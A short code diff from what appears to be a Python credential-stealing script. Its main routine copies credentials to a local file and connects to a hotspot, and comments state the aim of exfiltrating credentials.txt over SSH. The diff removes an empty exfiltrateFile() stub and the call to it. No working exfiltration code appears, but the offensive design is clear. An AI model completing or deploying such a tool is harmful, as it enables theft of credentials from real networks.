@@ -35,10 +35,6 @@ def connectInternet():
             isConnected = True
     print("Connection Established")   
 
-def exfiltrateFile():
-    #process to exfiltrate credentials.txt to external device from inside network
-    pass
-
 def main():
     time.sleep(0)# increase to around 30 to allow computer to start up
     print("STARTING INITIAL CONNECTION")
@@ -47,8 +43,6 @@ def main():
     credentialsLocalFile() # make a local copy of credentials
     print("STARTING SECOND CONNECTION")
     connectInternet() # connect to hotspot to exfiltrate local file
-    print("EXFILTRATING FILE TO EXTERNAL DEVICE")
-    exfiltrateFile() # SSH'ing to external device inside of network and transfering credentials.txt file
 
 if __name__=="__main__":
     main()
